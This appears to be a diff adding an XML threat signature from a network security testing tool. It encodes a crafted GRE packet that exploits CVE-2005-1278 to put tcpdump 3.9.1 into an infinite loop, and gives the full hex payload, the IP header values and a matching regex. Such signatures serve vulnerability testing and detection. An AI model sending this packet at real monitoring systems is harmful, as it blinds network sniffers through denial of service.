@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="tcpdump ISIS DOS"/>
+    <EngDesc display="true" value="This threat causes tcpdump to enter into an infinite loop.  This effectively causes a denial of service condition on tcpdump, leaving the user sniffing unaware of any further packets sent on the wire.  This packet emulates a GRE packet being placed on the wire."/>
+    <Intent display="true">
+      <item value="Evasion"/>
+      <item value="Implementation_Exploitation"/>
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="GRE"/>
+    <Type_Of_Equipment display="true">
+      <item value="Sniffer"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Tcpdump"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Tcpdump"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Tcpdump_3.9.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://downloads.securityfocus.com/vulnerabilities/exploits/xtcpdump-isis-dos.c"/>
+    <CVEID display="true" value="CVE-2005-1278"/>
+    <bugtraqID display="true" value="13392"/>
+    <OSVDB display="true" value="15862"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="0000010382084c5700c000a80001003c499a8dfb"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632776012255000000"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="IP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X00\X00\X00\XFE\X83\X1B\X01\X06\X12\X01\XFF\X07\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\XFF\X01\X07\X00\X00\XB9\XE8\XFF\X01"/>
+    <Created value="1142053709" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="40" Protocol="2F" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="000000FE831B01061201FF07FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF01070000B9E8FF01" CE="false" DF="true" MF="false"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
